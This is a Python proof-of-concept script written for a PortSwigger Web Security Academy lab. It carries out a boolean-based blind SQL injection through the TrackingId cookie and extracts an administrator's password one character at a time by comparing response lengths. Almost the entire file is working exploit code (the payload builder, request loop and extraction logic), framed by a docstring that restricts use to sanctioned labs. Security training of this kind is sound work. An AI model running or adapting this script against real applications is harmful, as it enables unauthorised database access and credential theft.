"""
Blind SQL Injection (Boolean/Conditional Response) - PortSwigger Lab PoC
-------------------------------------------------------------------------
Target lab type: "Blind SQL injection with conditional responses"
(PortSwigger Web Security Academy - https://portswigger.net/web-security/sql-injection/blind)

This script extracts the administrator's password character by character
from an Oracle-backed application via a boolean-based blind SQL injection
in the `TrackingId` cookie. It distinguishes true/false conditions by
comparing the length of the HTTP response body against a baseline
response, since the vulnerable lab always returns HTTP 200 regardless
of whether the injected condition is true or false.

INTENDED USE
------------
This script is written against PortSwigger Web Security Academy labs,
which are free, disposable, sanctioned environments explicitly designed
for practicing these techniques. Do not point this at any system you do
not own or do not have explicit written authorization to test - doing so
may be illegal in your jurisdiction.

USAGE
-----
    python blind_sqli_boolean.py --url https://YOUR-LAB-ID.web-security-academy.net \
        --session YOUR_SESSION_COOKIE \
        --tracking-id YOUR_TRACKING_ID_BASE

Both --session and --tracking-id come from your browser's cookies after
logging into your own instance of the lab (DevTools > Application >
Cookies, or Burp Suite's proxy history).
"""

import argparse
import string
import sys

import requests

ALPHABET = string.ascii_lowercase + string.digits
PASSWORD_LENGTH = 20  # PortSwigger labs use a fixed 20-character password
TIMEOUT_SECONDS = 10

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)


def build_payload(tracking_id_base: str, position: int, character: str) -> str:
    """Build the TrackingId payload testing one character at one position."""
    return (
        f"{tracking_id_base}' AND "
        f"(SELECT SUBSTR(password,{position},1) FROM users "
        f"WHERE username='administrator')='{character}"
    )


def send_request(session: requests.Session, url: str, session_cookie: str, tracking_id: str) -> requests.Response:
    cookies = {
        "TrackingId": tracking_id,
        "session": session_cookie,
    }
    headers = {"User-Agent": USER_AGENT}
    return session.get(url, cookies=cookies, headers=headers, timeout=TIMEOUT_SECONDS)


def get_baseline_length(session: requests.Session, url: str, session_cookie: str, tracking_id_base: str) -> int:
    """Request with a condition guaranteed FALSE to establish the baseline response length."""
    false_payload = f"{tracking_id_base}' AND '1'='2"
    response = send_request(session, url, session_cookie, false_payload)
    return len(response.text)


def extract_password(url: str, session_cookie: str, tracking_id_base: str) -> str:
    http_session = requests.Session()

    print("[*] Establishing baseline (false-condition) response length...")
    baseline_length = get_baseline_length(http_session, url, session_cookie, tracking_id_base)
    print(f"[*] Baseline length: {baseline_length} bytes\n")

    password = ""

    for position in range(1, PASSWORD_LENGTH + 1):
        found_char = None

        for character in ALPHABET:
            payload = build_payload(tracking_id_base, position, character)

            try:
                response = send_request(http_session, url, session_cookie, payload)
            except requests.exceptions.RequestException as exc:
                print(f"[-] Request error at position {position}, char '{character}': {exc}")
                continue

            # A TRUE condition changes the response body length relative to baseline
            # (the lab injects extra markup/content when the condition holds).
            if len(response.text) != baseline_length:
                found_char = character
                password += character
                print(f"[+] Position {position}: '{character}'  -> password so far: {password}")
                break

        if not found_char:
            print(f"[-] No matching character found at position {position}. Stopping early.")
            break

    return password


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Boolean-based blind SQL injection PoC for PortSwigger Web Security Academy."
    )
    parser.add_argument("--url", required=True, help="Target lab URL, e.g. https://YOUR-LAB-ID.web-security-academy.net")
    parser.add_argument("--session", required=True, help="Value of your lab 'session' cookie")
    parser.add_argument("--tracking-id", required=True, help="Base value of your lab 'TrackingId' cookie")
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    print("[*] Starting character-by-character password extraction...")
    print(f"[*] Target: {args.url}\n")

    password = extract_password(args.url, args.session, args.tracking_id)

    print(f"\n[!] Recovered password: {password}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit("\n[-] Interrupted by user.")
